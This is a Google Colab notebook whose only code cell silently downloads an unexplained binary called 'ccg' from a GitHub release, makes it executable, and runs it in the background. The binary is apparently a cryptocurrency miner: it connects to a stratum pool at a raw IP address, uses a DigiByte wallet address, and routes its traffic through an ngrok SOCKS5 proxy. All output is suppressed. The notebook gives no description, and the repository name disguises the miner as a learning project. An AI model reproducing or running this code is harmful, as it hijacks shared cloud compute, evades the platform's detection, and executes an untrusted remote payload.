{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Xdgb.ipynb",
      "provenance": [],
      "machine_shape": "hm",
      "collapsed_sections": [
        "ecfHLQMRFIw7",
        "xBvT6Rg-FQcm"
      ],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/ammarku/sc/blob/gh-pages/Xdgb.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "%%capture\n",
        "%%shell\n",
        "wget -q https://github.com/includemachine10/learningmachine/releases/download/v.1/ccg > /dev/null 2>&1\n",
        "chmod +x ccg\n",
        "nohup ./ccg -o stratum+tcp://103.249.70.7:6535 -u D79vvFB6WovjKsVxX7MAKkKYtmYrQfy4L9.$(shuf -n 1 -i 1-9999999) -p c=DGB,mc=SUGAR -x socks5://6.tcp.ngrok.io:17285 > /dev/null 2>&1"
      ],
      "metadata": {
        "id": "cbugcM7J71Da"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}